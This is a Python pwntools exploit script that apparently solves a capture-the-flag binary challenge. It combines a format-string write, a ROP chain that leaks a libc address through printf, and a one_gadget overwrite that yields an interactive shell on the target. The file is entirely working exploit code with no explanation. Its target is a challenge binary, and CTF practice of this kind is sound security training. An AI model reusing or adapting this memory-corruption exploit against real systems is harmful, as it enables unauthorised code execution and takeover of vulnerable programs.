from pwn import *

exe = context.binary = ELF('./vuln_patched', checksec=False)
libc = ELF('./libc-2.31.so', checksec=False)


r = exe.process()
gdb.attach(r, api=True, gdbscript='''
           b*0x401291
           b*0x4012ae
           c
           ''')

# r = remote('sprinter.chal.idek.team', 1337)

pop_rdi = 0x401373
pop_rbp = 0x4011dd
ret = 0x40101a

r.recvuntil(b'at ')
out = r.recv(14)
buff_addr = int(out, 16)
print(hex(buff_addr))


saverip = buff_addr + 280
saverbp = buff_addr + 288
rbp_addr = buff_addr + 272
leave_ret = 0x00000000004012ad

libc.sym['one_gadget'] = 0xe3b01



new_saverbp = buff_addr + 184
print('buff_add: ' + hex(new_saverbp))
s_newsaverbp = str(hex(new_saverbp))
off_set = int('0x' + s_newsaverbp[12:14], 16)
print(off_set)
if off_set - 9 < 0:
    r.close()
elif off_set > 0xad :
    r.close()
    
payload = b''

payload = b'%6c'.ljust(8, b'\x00') + b'\x00' + b'%' + str(off_set - 9).encode('utf-8') + b'c%27$hhn' + b'%' + str(0xad - off_set).encode('utf-8') + b'c%28$hhn' 
payload = payload.ljust(56, b'\x00') + b'\x00'*120 + p64(rbp_addr) + p64(saverip) + p64(pop_rdi) + p64(exe.got['printf']) + p64(exe.sym['printf']) + p64(ret) + p64(exe.sym['vuln']) + p64(pop_rbp) + p64(buff_addr) + p64(leave_ret)

r.sendafter(b': ', payload)

out = r.recv(6)
print(out)
libc_leak = u64(out + b'\x00'*2)
libc.address = libc_leak - libc.sym['printf']
print('libc_base: ' + hex(libc.address))
print('one_gadget: ' + hex(libc.sym['one_gadget']))

payload = b'n'*55 + p64(libc.sym['one_gadget'])
r.sendlineafter(b': ', payload)

r.interactive()